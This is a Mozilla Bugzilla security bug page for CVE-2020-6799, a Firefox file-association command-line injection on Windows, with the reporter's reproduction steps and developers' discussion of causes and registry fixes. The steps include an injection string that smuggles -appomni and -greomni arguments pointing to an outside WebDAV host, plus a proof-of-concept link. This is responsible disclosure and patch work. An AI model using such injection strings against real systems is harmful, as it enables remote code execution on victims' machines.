=== Content from bugzilla.mozilla.org_24c58687_20250119_140911.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1606596)
* [XML](/show_bug.cgi?ctype=xml&id=1606596)

Closed
[Bug 1606596](/show_bug.cgi?id=1606596)
(CVE-2020-6799)

Opened 5 years ago
Closed 5 years ago

# File association Remote Code Execution via command line parameter injection in Firefox

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

File association Remote Code Execution via command line parameter injection in Firefox

## Categories

### (Firefox :: Installer, defect)

[Product:](/describecomponents.cgi?product=Firefox)

Firefox
▾

Firefox
For bugs in Firefox Desktop, the Mozilla Foundation's web browser. For Firefox user interface issues in menus, bookmarks, location bar, and preferences. Many Firefox bugs will either be filed here or in the [Core](https://bugzilla.mozilla.org/describecomponents.cgi?product=Core) product. Bugs for developer tools (F12) should be filed in the [DevTools](https://bugzilla.mozilla.org/describecomponents.cgi?product=DevTools) product. ([more info](https://wiki.mozilla.org/Modules/All#Firefox))
[See Open Bugs in This Product](/buglist.cgi?product=Firefox&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Firefox)
Watch This Product

[Component:](/describecomponents.cgi?product=Firefox&component=Installer#Installer)

Installer
▾

Firefox :: Installer
Bugs and feature requests for the Firefox application install wizard.
[See Open Bugs in This Component](/buglist.cgi?product=Firefox&component=Installer&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Firefox&component=Installer&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Firefox&component=Installer)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

normal

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

Firefox 74

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Accessibility Severity | --- |
| --- | --- |
| Performance Impact | --- |
| Webcompat Priority | --- |
| a11y-review | --- |
| Webcompat Score | --- |
| Install Update Workflow | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr68 | [73+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=73%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=fixed) |
| firefox72 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=wontfix) |
| firefox73 | [+](/buglist.cgi?f1=cf_tracking_firefox73&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=fixed) |
| firefox74 | [+](/buglist.cgi?f1=cf_tracking_firefox74&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox74&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| firefox-esr68 | 73+ | fixed |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox72 |  | wontfix |
| firefox73 | + | fixed |
| firefox74 | + | fixed |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: jpg.inc.au, Assigned: molly)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/59fd68692a3013b8c8fa55f0d27bb43c?d=mm&size=40)  [molly](/user_profile?user_id=550257)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/645309812b791b24a1d272e82e633f19?d=mm&size=40)  [jpg.inc.au](/user_profile?user_id=600722)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/22a9d29be79d978dd156fae057543c68?d=mm&size=40)  [mpohle](/user_profile?user_id=711194)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

13 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

[1531475](/show_bug.cgi?id=1531475 "RESOLVED FIXED - Evaluate whether the greomni and appomni command line args can be removed or have restrictions for their paths")

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

Dependency [tree](/showdependencytree.cgi?id=1606596&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=1606596)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

[1619122](/show_bug.cgi?id=1619122 "VERIFIED FIXED - Firefox don't listed in context menu \"open with...\" with file type .jpg extension")

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[CVE-2019-9794](/show_bug.cgi?id=1530103 "VERIFIED FIXED - URI handler Remote Code Execution via command line parameter injection in Firefox")

[1531475](/show_bug.cgi?id=1531475 "RESOLVED FIXED - Evaluate whether the greomni and appomni command line args can be removed or have restrictions for their paths")

## Details

### (Keywords: csectype-priv-escalation, reporter-external, sec-moderate, Whiteboard: [reporter-external] [client-bounty-form] [verif?][post-critsmash-triage][adv-main73+] [adv-esr68.5+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2020-6799

[Keywords:](/describekeywords.cgi)

[csectype-priv-escalation](/buglist.cgi?keywords=csectype-priv-escalation&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[reporter-external] [client-bounty-form] [verif?][post-critsmash-triage][adv-main73+] [adv-esr68.5+]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a2802280_1689 "5 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
| [bmaris](/user_profile?user_id=458188) | [qe-verify](#a1322679_458188 "5 years ago") | - |
| --- | --- | --- |
| [bmaris](/user_profile?user_id=458188) | qe-verify | - |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | blocking-fx-sync1.7 | ? |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (3 files, 1 obsolete file)

| [Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin](/attachment.cgi?id=9119189)  [5 years ago](#c14)  [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)   47 bytes, text/x-phabricator-request | RyanVM : [approval-mozilla-beta+](#c32 "5 years ago")  jcristau : [approval-mozilla-release-](#c34 "5 years ago")  RyanVM : [approval-mozilla-esr68+](#c35 "5 years ago")  tjr : [sec-approval+](#c28 "5 years ago") | [Details](/attachment.cgi?id=9119189&action=edit) | [Review](/attachment.cgi?id=9119189) |
| --- | --- | --- |
| [Simple node WebDAV server that will respond to any folder/file name](/attachment.cgi?id=9119318)  [5 years ago](#c21)  [Joshua Graham](/user_profile?user_id=600722)   8.03 KB, text/plain |  | [Details](/attachment.cgi?id=9119318&action=edit) |
| [advisory.txt](/attachment.cgi?id=9122670)  [5 years ago](#c43)  [Tom Ritter [:tjr]](/user_profile?user_id=578488)   453 bytes, text/plain |  | [Details](/attachment.cgi?id=9122670&action=edit) |
| [advisory.txt](/attachment.cgi?id=9122901)  [5 years ago](#c46)  [Tom Ritter [:tjr]](/user_profile?user_id=578488)   786 bytes, text/plain |  | [Details](/attachment.cgi?id=9122901&action=edit) |

Show Obsolete

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Joshua Graham](/user_profile?user_id=600722)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1606596#c0)• 5 years ago |
|  | |

Tested on Microsoft Windows 10 Enterprise version 10.0.17763 Build 17763

Using Firefox version 71.0 (32-bit)

Steps to reproduce (local only):

* Setup Firefox as Windows' default .pdf handler (right click a pdf file -> open with -> chose other -> select always open with Firefox)
* Open the run prompt (windows key + r) and run the following URL:
* \\poiu.xss.vg@ssl\a.txt" -appomni appomni.pdf -greomni \share\greomni.pdf

Steps to reproduce (via MS Excel):

* Setup Firefox as Windows' default .pdf handler (right click a pdf file -> open with -> chose other -> select always open with Firefox)
* visit <https://poiu.xss.vg/oausdhvjzlxkcn/poc.html> (this will open a CSV file in excel)
* Click the link in the excel document.
* Open the greomni.pdf file

Expected Result: Firefox ignores the shell activation command as additional command line arguments are present.

Actual Result: Firefox accepts the command and runs using the greomni and appomni files from the internet share.

Detailed Information:

This issue is very similar to [bug 1530103](/show_bug.cgi?id=1530103 "VERIFIED FIXED - URI handler Remote Code Execution via command line parameter injection in Firefox") and [bug 384384](/show_bug.cgi?id=384384 "RESOLVED FIXED - Multiple Vendor Multiple Browser Interaction URI Handler Command Injection Vulnerability") except that it is by file type association as opposed to protocol association.

In Windows, it is possible to inject arbitrary arguments when Firefox is setup as the default file handler for any file type other than .html. This can result in remote code execution when the 'greomni' flag is injected.

The attack vector is having a victim activate a URI using the file protocol (file://) or open a file in explorer where the file type's default handler is Firefox and there are double quotes in the path of the file. One way of fixing this issue is to add the 'osint' flag to the following registry key:

HKEY\_CLASSES\_ROOT\applications\firefox.exe\shell\open\command

i.e. change:

* "C:\Program Files (x86)\Mozilla Firefox\firefox.exe" "%1"

to

* "C:\Program Files (x86)\Mozilla Firefox\firefox.exe" -osint "%1"

The ‘osint’ flag in the command is supposed to ensure that Firefox ignores any command line arguments that have been injected when Firefox is activated via the Windows registry. The ‘osint’ flag was introduced in 2007 in response to the following bug: <https://bugzilla.mozilla.org/show_bug.cgi?id=384384>

RCE is achieved by introducing malicious code into the contents of files in the omni.ja archive. This is the same as discussed in [bug 1530103](/show_bug.cgi?id=1530103 "VERIFIED FIXED - URI handler Remote Code Execution via command line parameter injection in Firefox").

Although it shouldn't be possible to inject double quotes in a file path in windows as the double quote character is illegal in a file path, Microsoft has confirmed that they won't be fixing this issue (<https://www.zerodayinitiative.com/advisories/ZDI-19-1023/>)

Credit:

Joshua Graham of TSS

Flags: sec-bounty?

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1606596#c1)• 5 years ago |
|  | |

Thanks for the report!

(In reply to Joshua Graham from [comment #0](/show_bug.cgi?id=1606596#c0 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))

> The attack vector is having a victim activate a URI using the file protocol (file://) or open a file in explorer where the file type's default handler is Firefox and there are double quotes in the path of the file. One way of fixing this issue is to add the 'osint' flag to the following registry key:
>
> HKEY\_CLASSES\_ROOT\applications\firefox.exe\shell\open\command
>
> i.e. change:
>
> * "C:\Program Files (x86)\Mozilla Firefox\firefox.exe" "%1"
>
> to
>
> * "C:\Program Files (x86)\Mozilla Firefox\firefox.exe" -osint "%1"
>
> The ‘osint’ flag in the command is supposed to ensure that Firefox ignores any command line arguments that have been injected when Firefox is activated via the Windows registry. The ‘osint’ flag was introduced in 2007 in response to the following bug: <https://bugzilla.mozilla.org/show_bug.cgi?id=384384>
>
> RCE is achieved by introducing malicious code into the contents of files in the omni.ja archive. This is the same as discussed in [bug 1530103](/show_bug.cgi?id=1530103 "VERIFIED FIXED - URI handler Remote Code Execution via command line parameter injection in Firefox").

I'm a little puzzled here. This may be a simple oversight, but if it's more than that I'd like to have it figured out...

I haven't tried the exploit myself yet, but I'd expect the `-osint` commandline you describe, without a further `-url` argument, not to work on Firefox 69+ (and newer versions of ESR), because of the changes in [bug 1572838](/show_bug.cgi?id=1572838 "VERIFIED FIXED - URI Handler Command Injection Vulnerability [iDefense V-bsk2ottbf1]") (see code at <https://searchfox.org/mozilla-central/source/toolkit/xre/CmdLineAndEnvUtils.h#197> and elsewhere ). That is, `firefox.exe -osint path/to/file` should, if I'm reading my own code right a few months later, fail to do anything (it'll exit early). `firefox.exe -osint -url file:url-of-some-kind` should work, I think. Is that what you meant, or are you also (intentionally or accidentally :-) ) reporting that those checks don't work the way I think they do?

Molly: assuming the `-osint` path is the way to go, how hard would it be to update existing installs so the argument is inserted as necessary? I assume fixing new installs "just" means adding things around <https://searchfox.org/mozilla-central/rev/331f0c3b25089c9a16be65f4dc8c601aeaac8cc4/browser/installer/windows/nsis/shared.nsh#521> or thereabouts?

Tentatively moving to the installer component given that that's where the registration code lives.

Component: Security → InstallerFlags: needinfo?(mhowell)Flags: needinfo?(jpg.inc.au)

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1606596#a13086_159069)• 5 years ago |

Type: task → defectSee Also: → [1531475](/show_bug.cgi?id=1531475 "RESOLVED FIXED - Evaluate whether the greomni and appomni command line args can be removed or have restrictions for their paths"), [CVE-2019-9794](/show_bug.cgi?id=1530103 "VERIFIED FIXED - URI handler Remote Code Execution via command line parameter injection in Firefox")

|  | [Joshua Graham](/user_profile?user_id=600722)  Reporter |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1606596#c2)• 5 years ago |
|  | |

My bad, I double checked and yes it does need -osint -url :-)

Flags: needinfo?(jpg.inc.au)

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1606596#c3)• 5 years ago |
|  | |

(In reply to Joshua Graham from [comment #2](/show_bug.cgi?id=1606596#c2 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))

> My bad, I double checked and yes it does need -osint -url :-)

Thanks for the quick response. I'm glad I got that right at least...

Leaving this for the installer folks to see if/how to add the `-osint` thing to the default open command. I also pinged [bug 1531475](/show_bug.cgi?id=1531475 "RESOLVED FIXED - Evaluate whether the greomni and appomni command line args can be removed or have restrictions for their paths") to see if we can just deprecate these (appomni/greomni) arguments (though that'd likely still leave other issues so we'd need to fix this bug either way).

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1606596#c4)• 5 years ago |
|  | |

[apologies for the slow response to a security bug; the "installer folks" are actually just me, and I'm off and not checking mail much this week]

TL;DR: I don't think we can fix this in the file association registration code.

The reason why registering a file association in the way that the STR does ends up with a command line that's missing its `-osint` is because our installer doesn't register us as a handler for `.pdf` when any other handler for it exists (an academic condition on Windows 10, because Edge always exists as a registered PDF handler). That means the Open With dialog fails to find any command string that we've created and instead synthesizes a handler with a default command line (one with no arguments). That procedure creates the `HKCR\Applications\firefox.exe` key for this purpose, so that's why editing the command in there works.

That all implies that we could fix this by registering as a `.pdf` handler, but there are two problems with that:

1. We intentionally leave out that handler as a long-standing product decision (reference [bug 1573267 comment 3](/show_bug.cgi?id=1573267#c3 "RESOLVED INVALID - Handlers for non-HTML file types only registered when setting default browser")).
2. Worse than that, I don't see anything that makes this bug specific to PDF files; it seems like opening any local file of a type that's had an association manually created for it would trigger this, even for types we really don't support opening. And we can't have handlers for every possible file extension.

If there were a way to override the command line for all file associations registered to the `.exe` at a certain path, even custom-made associations, then that would work, but I can't find any such thing (that wouldn't also affect every process started from that path, which we do not want to do). We can't use the key at `HKCR\Applications\firefox.exe` because the File Explorer only looks it up by file name, not by anything unique to the install path.

So unless I'm wrong and there is something PDF-specific here, I'm afraid we end up needing a more general command-line handling fix.

(In reply to :Gijs (he/him) from [comment #1](/show_bug.cgi?id=1606596#c1 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))

> Molly: assuming the `-osint` path is the way to go, how hard would it be to update existing installs so the argument is inserted as necessary? I assume fixing new installs "just" means adding things around <https://searchfox.org/mozilla-central/rev/331f0c3b25089c9a16be65f4dc8c601aeaac8cc4/browser/installer/windows/nsis/shared.nsh#521> or thereabouts?

The command line in that key isn't used to open files, it's intended to start the application in a default state (I'm actually not sure it's used at all nowadays; it's what the old web browser shortcut that used to be at the top of the start menu would run). The command line that's used for the file type handlers we register is the one [here](https://searchfox.org/mozilla-central/rev/053826b10f838f77c27507e5efecc96e34718541/browser/installer/windows/nsis/installer.nsi#439) (set by the installer) and [here](https://searchfox.org/mozilla-central/rev/053826b10f838f77c27507e5efecc96e34718541/browser/installer/windows/nsis/shared.nsh#846) (set during updates).

Flags: needinfo?(mhowell)

|  | [Joshua Graham](/user_profile?user_id=600722)  Reporter |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1606596#c5)• 5 years ago |
|  | |

> So unless I'm wrong and there is something PDF-specific here, I'm afraid we end up needing a more general command-line handling fix.

You are correct, it isn't PDF specific, any file type association will do it.

> If there were a way to override the command line for all file associations registered to the .exe at a certain path, even custom-made associations, then that would work, but I can't find any such thing (that wouldn't also affect every process started from that path, which we do not want to do). We can't use the key at HKCR\Applications\firefox.exe because the File Explorer only looks it up by file name, not by anything unique to the install path.

I'm a little confused by the "at a certain path" and "unique to the install path" parts of your comment. Custom made associations are added to `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\<extension>\UserChoice` and when you chose Firefox it gets the value `Applications\firefox` which points it to the `HKCR\Applications\firefox.exe` key.

Google Chrome was vulnerable to this issue a few months back but it looks like they have patched it (not reported by me). When you set chrome to be the default it's `UserChoice` value becomes `Applications\chrome.exe` which has the value `C:\Program Files...\chrome.exe -- %1%`. The `--` is equivalent to `-osint -url` in Firefox so it must be possible to update that registry key?

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1606596#c6)• 5 years ago |
|  | |

(In reply to Joshua Graham from [comment #5](/show_bug.cgi?id=1606596#c5 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))

> I'm a little confused by the "at a certain path" and "unique to the install path" parts of your comment. Custom made associations are added to `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\<extension>\UserChoice` and when you chose Firefox it gets the value `Applications\firefox` which points it to the `HKCR\Applications\firefox.exe` key.

The problem is that the only thing that names that key is the string `firefox.exe`, but the command string has to contain an absolute path to a specific installation; there's an implicit assumption there that only one binary called `firefox.exe` ever exists on a machine, but we explicitly support having multiple installations of Firefox that can all participate in file associations, so that assumption is wrong for us. The file type keys that we create have names that start with `FirefoxHTML`, followed by an installation-specific hash, so that more than one installation can participate in file associations and not just the most recently installed one. A key just named `firefox.exe` breaks this support. Chrome can sometimes avoid problems like this because they don't have general support for multiple installations, but one of the specific cases they do support is having different channels installed, so this breaks even that because every channel calls its binary `chrome.exe` just as ours are always `firefox.exe`.

It's possible we could do something like check on startup for an `HKCR\Applications\firefox.exe` key and manually update its command line no matter what installation it's for. That would still leave the first launch after the file association is created vulnerable, but it's something.

> Google Chrome was vulnerable to this issue a few months back but it looks like they have patched it (not reported by me). When you set chrome to be the default it's `UserChoice` value becomes `Applications\chrome.exe` which has the value `C:\Program Files...\chrome.exe -- %1%`. The `--` is equivalent to `-osint -url` in Firefox so it must be possible to update that registry key?

Hmm, I don't see where that's happening; for me running release Chrome, the `Applications\chrome.exe` key gets created by `OpenWith.exe` with the same sort of command line it uses for us, without the `--`, and that is the command line that's used to create the process (that is, nothing is overriding it). I thought that maybe Chrome would rewrite the registry value when it starts, but it doesn't touch it; neither does the installer. I can't find any code that would explicitly do this via their code search tool, either. Do you know if maybe that fix just isn't on their release channel yet?

|  | [Joshua Graham](/user_profile?user_id=600722)  Reporter |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1606596#c7)• 5 years ago |
|  | |

I've tried on two different computer with the same version of release chrome. One is windows 10 Pro (adds --), one is Enterprise (doesn't add --). It may have nothing to do with the windows version but i'm at a loss to explain what is going on sorry.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1606596#a333287_1689)• 5 years ago |

Depends on: [1531475](/show_bug.cgi?id=1531475 "RESOLVED FIXED - Evaluate whether the greomni and appomni command line args can be removed or have restrictions for their paths")Keywords: [csectype-priv-escalation](/buglist.cgi?keywords=csectype-priv-escalation&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

|  | [Mike Hommey [:glandium]](/user_profile?user_id=47192) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1606596#c8)• 5 years ago |
|  | |

I wonder at what stage of the command line "parsing" we end up considering what was supposed to be passed as one argument as multiple ones, including flags.

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1606596#c9)• 5 years ago |
|  | |

As a workaround, I can have the installer/updater preemptively create `{HKLM,HKCU}\Applications\firefox.exe` and fill it in with the correct command line. That will mean we get listed as an option in Open With for every file type, which I don't like, but by adding a `SupportedTypes` key we can at least keep our entry below the fold for all the types we don't support. It also means that only one installation at a time can be set this way, as discussed above, but I think that would more or less match the current behavior. I'm going to test out that idea and see if it works the way I hope it does and doesn't break anything else.

I still think the best fix is on the command-line handling side though, either by altering the parsing or by removing or restricting the arguments involved.

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1606596#c10)• 5 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1606596&comment_id=14576483 "1 revision") |
|  | |

(In reply to Mike Hommey [:glandium] from [comment #8](/show_bug.cgi?id=1606596#c8 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))

> I wonder at what stage of the command line "parsing" we end up considering what was supposed to be passed as one argument as multiple ones, including flags.

I expect it's just that we get the arguments' argv/argc combo in `main()` with the wrong values? The docs at <https://docs.microsoft.com/en-us/cpp/cpp/main-function-command-line-args?view=vs-2019#parsing-c-command-line-arguments> (and the sad tales at <https://docs.microsoft.com/en-gb/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way> ) seem to suggest that to me, but I could be wrong about that. (to offer slightly more detail: the double quotes in the file path seem to cause the subsequent arguments to be parsed as individual arguments by the C++ runtime / Windows / whatever -- rather than as a single string, which is how they were intended)

Would we be able to usefully put things back together at that point, in a way that wouldn't break legitimate uses? It seems pretty audacious to be claiming we can do the arg parsing better than the OS, especially if information (about escaping etc.) already got thrown away when the URL was initially passed by the OS. Nathan, what do you think?

Flags: needinfo?(nfroyd)

|  | [Mike Hommey [:glandium]](/user_profile?user_id=47192) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1606596#c11)• 5 years ago |
|  | |

My reading of your comment is that Windows itself would be doing something wrong and there's not much we can do about it, except not allowing any flags on the command line at all...

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1606596#c12)• 5 years ago |
|  | |

(In reply to Mike Hommey [:glandium] from [comment #11](/show_bug.cgi?id=1606596#c11 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"))

> My reading of your comment is that Windows itself would be doing something wrong and there's not much we can do about it, except not allowing any flags on the command line at all...

This is my interpretation of [comment #0](/show_bug.cgi?id=1606596#c0 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox"), yeah, esp:

> Although it shouldn't be possible to inject double quotes in a file path in windows as the double quote character is illegal in a file path, Microsoft has confirmed that they won't be fixing this issue (<https://www.zerodayinitiative.com/advisories/ZDI-19-1023/>)

That is, my understanding is that Windows' system for quoting means that the `"` in the filename ought to be preceded by a `\`. I'd expect the steps from [comment #0](/show_bug.cgi?id=1606596#c0 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox") with:

> ```
> \\poiu.xss.vg@ssl\a.txt\" -appomni appomni.pdf -greomni \share\greomni.pdf
>
> ```

To be parsed correctly, assuming the windows run dialog basically resolves the entire string as a file, then passes it to Firefox in double quotes - because after all, file names can't contain double quotes. Except here, they do.

But that report points to a webdav issue. Reporter, can you clarify whether a similar exploit also works with other applications and their commandline switches? (doesn't necessarily have to do anything "bad", just, does it break commandline parsing for all apps, or are we the odd one out?)

Anyway, it's also totally plausible that I'm misreading what's going on here. But I *think* our commandline parsing by and large trusts the argv/argc stuff we get, and doesn't try to take a full input string and parse it ourselves in some way - or otherwise reconstitute command line switches or what-have-you.

Flags: needinfo?(jpg.inc.au)

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1606596#c13)• 5 years ago |
|  | |

The workaround I mentioned in [comment 9](/show_bug.cgi?id=1606596#c9 "RESOLVED FIXED - File association Remote Code Execution via command line parameter injection in Firefox") does appear to do the job, as in processes that are created to open files with custom associations get the correct command line after that change, and it doesn't seem to have any confusing effects on the open with dialog (I tried it on Windows 7 and 10). So, since the command-line handling side is still under active discussion I think it's a good idea to go ahead and get that patch moving.

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1606596#c14)• 5 years ago |
|  | |

Attached file
[Bug 1606596 - Install/uninstall an HKCR\Applications key for firefox.exe. r=agashlin](attachment.cgi?id=9119189)
— [Details](attachment.cgi?id=9119189&action=edit)

|  | [Phabricator Automation](/user_profile?user_id=600971) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1606596#a473666_600971)• 5 years ago |

Assignee: nobody → mhowell

|  | [Joshua Graham](/user_profile?user_id=600722)  Reporter |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1606596#c15)• 5 years ago |
|  | |

> But that report points to a webdav issue. Reporter, can you clarify whether a similar exploit also works with other applications and their commandline switches? (doesn't necessarily have to do anything "bad", just, does it break commandline parsing for all apps, or are we the odd one out?)

Yes, this is not a Firefox specific issue. Similar exploits work on other applications. The Zero Day Initiative report detailed the underlying issue to Microsoft (i.e. fix the WebDAV client so that double quotes can't appear in the path) in the hope that the attack vector could be killed altogether. Since the attack vector will remain I decided to report it to the individual applications to see if they could mitigate the risk themselves.

Do you still need my WebDAV server up for you to reproduce the issue? or am I OK to take it down?

Flags: needinfo?(jpg.inc.au) → needinfo?(mhowell)

|  | [Molly Howell (she/her) (mostly inactive)](/user_profile?user_id=550257)  Assignee |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1606596#c16)• 5 years ago |
|  | |

I don't need the WebDAV server for my part; redirecting to Gijs who asked about it.

Flags: needinfo?(mhowell) → needinfo?(gijskruitbosch+bugs)

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1606596#c17)• 5 years ago |
|  | |

The webdav server is probably going to be useful to QA to verify that the issue is fixed, so if it is not onerous to keep the server up I think that would be desirable. If it isn't viable for you to do so, where would I look for instructions to set this type of thing up ourselves?

Flags: needinfo?(gijskruitbosch+bugs) → needinfo?(jpg.inc.au)

